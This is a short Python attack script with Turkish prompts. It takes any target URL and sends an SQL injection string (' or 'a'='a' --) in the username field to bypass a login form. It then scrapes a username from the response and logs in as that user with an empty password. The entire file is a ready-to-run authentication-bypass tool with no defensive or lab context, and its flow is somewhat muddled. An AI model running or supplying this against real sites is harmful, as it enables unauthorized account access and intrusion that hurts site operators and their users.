import requests
from bs4 import BeautifulSoup

target_url = input("Hedef URL'yi girin: ")

session_data = {}

def login(username, password):
    login_data = {
        'username': username,
        'password': password
    }
    response = requests.post(target_url, data=login_data)
    if response.status_code == 200:
        session_data.update(response.cookies)
        print("Giriş başarılı!")
        return True
    else:
        print("Giriş yapılamadı.")
        return False

def get_user_credentials():
    payload = {
        'username': "' or 'a'='a' --",
        'password': 'whatever'
    }
    response = requests.post(target_url, data=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        username_field = soup.find('input', {'name': 'username'})
        if username_field:
            username = username_field['value']
            print("SQL Injection ile Authentication Bypass başarılı!")
            print(f"Kullanıcı adı: {username}")
            return username
    print("SQL Injection ile Authentication Bypass başarısız.")
    return None

if login('', ''):
    username = get_user_credentials()
    if username:
        response = login(username, '')
        if response:
            print("Oturum bilgileriyle otomatik giriş başarılı!")
        else:
            print("Oturum bilgileriyle otomatik giriş başarısız.")
